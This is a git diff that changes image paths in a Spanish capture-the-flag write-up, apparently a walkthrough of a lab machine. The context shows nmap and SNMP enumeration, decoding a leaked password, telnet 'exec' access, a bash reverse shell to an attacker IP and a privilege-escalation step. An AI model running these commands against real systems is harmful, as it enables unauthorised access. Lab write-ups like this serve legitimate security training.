@@ -2,7 +2,7 @@
 
 ---
 
-![imagenimagen](/images/20250523112657.png)
+![imagenimagen](images/20250523112657.png)
 
 ###### Técnicas demostradas:
 
@@ -19,7 +19,7 @@ Realizamos el escaneo de puertos por TCP con `nmap`
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.107 -oG allPorts
 ```
 
-![imagenimagen](/images/20250429111124.png)
+![imagenimagen](images/20250429111124.png)
 
 Realizamos un escaneo exhaustivo del puertos encontrado.
 
@@ -27,7 +27,7 @@ Realizamos un escaneo exhaustivo del puertos encontrado.
 nmap -p23 -sCV 10.10.11.107 -oN targeted
 ```
 
-![imagenimagen](/images/20250429111530.png)
+![imagenimagen](images/20250429111530.png)
 
 Haremos un escaneo de los puertos `UDP` de la máquina.
 
@@ -41,7 +41,7 @@ Lo analizamos de forma exhaustiva
 nmap -p161 -sU -sV -sC 10.10.11.107
 ```
 
-![imagenimagen](/images/20250429120521.png)
+![imagenimagen](images/20250429120521.png)
 
 Ya que el `SNMP` es público vamos a usar la herramienta `snmpwalk` para obtener información
 
@@ -49,7 +49,7 @@ Ya que el `SNMP` es público vamos a usar la herramienta `snmpwalk` para obtener
 snmpwalk -v 2c -c public 10.10.11.107
 ```
 
-![imagenimagen](/images/20250429120647.png)
+![imagenimagen](images/20250429120647.png)
 
 Lanzaremos una consulta `MIB` --> [Emisión de una consulta MIB de SNMP - Documentación de IBM](https://www.ibm.com/docs/es/networkmanager/4.2.0?topic=information-issuing-snmp-mib-query)
 
@@ -57,7 +57,7 @@ Lanzaremos una consulta `MIB` --> [Emisión de una consulta MIB de SNMP - Docume
 snmpwalk -v 2c -c public 10.10.11.107 1
 ```
 
-![imagenimagen](/images/20250429121023.png)
+![imagenimagen](images/20250429121023.png)
 
 Mediante Python vamos a decodificar esta cadena
 
@@ -69,7 +69,7 @@ s='50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 1 3 9 17 18 19 22 23 25 26
 binascci.unhexlify(s.replace(' ',''))
 ```
 
-![imagenimagen](/images/20250429121737.png)
+![imagenimagen](images/20250429121737.png)
 
 Otra manera de hacerlo mediante `bash`
 
@@ -83,7 +83,7 @@ Ahora que tenemos la contraseña vamos a conectarnos a la máquina por `Telnet`
 telnet 10.10.11.107 23
 ```
 
-![imagenimagen](/images/20250429121842.png)
+![imagenimagen](images/20250429121842.png)
 
 Si usamos la `?` para que nos muestre las opciones
 
@@ -93,7 +93,7 @@ Si usamos la `?` para que nos muestre las opciones
 
 Llama la atención que permite la ejecución de comando mediante `exec` pero antes vamos a probar otra cosa.
 
-![imagenimagen](/images/20250429121904.png)
+![imagenimagen](images/20250429121904.png)
 
 Probamos a cambiar el nombre del host
 
@@ -101,7 +101,7 @@ Probamos a cambiar el nombre del host
 host-name: test.htb
 ```
 
-![imagenimagen](/images/20250429122148.png)
+![imagenimagen](images/20250429122148.png)
 
 Tras no poder actualizarlo vamos a ejectar otro comando
 
@@ -111,7 +111,7 @@ exec id
 
 Como vemos el usuario es `lp` que pertenece al grupo `lpadmin`
 
-![imagenimagen](/images/20250429122325.png)
+![imagenimagen](images/20250429122325.png)
 
 Sabiendo esto vamos a preparar un payload con Python para entablarnos una reverse shell, podremos a la escucha a nuestra máquina por el puerto 1234
 
@@ -131,11 +131,11 @@ o
 exec bash -c "bash -i >& /dev/tcp/10.10.14.9/1234 0>&1"
 ```
 
-![imagenimagen](/images/20250429123054.png)
+![imagenimagen](images/20250429123054.png)
 
 En el directorio personal del usuario `lp` tenemos la primera flag
 
-![imagenimagen](/images/20250429123213.png)
+![imagenimagen](images/20250429123213.png)
 
 #### Escalada de privilegios:
 
@@ -153,8 +153,8 @@ Por último lo ejecutamos:
 ./priv
 ```
 
-![imagenimagen](/images/20250430102908.png)
+![imagenimagen](images/20250430102908.png)
 
 Tenemos la flag de root:
 
-![imagenimagen](/images/20250430102948.png)
+![imagenimagen](images/20250430102948.png)
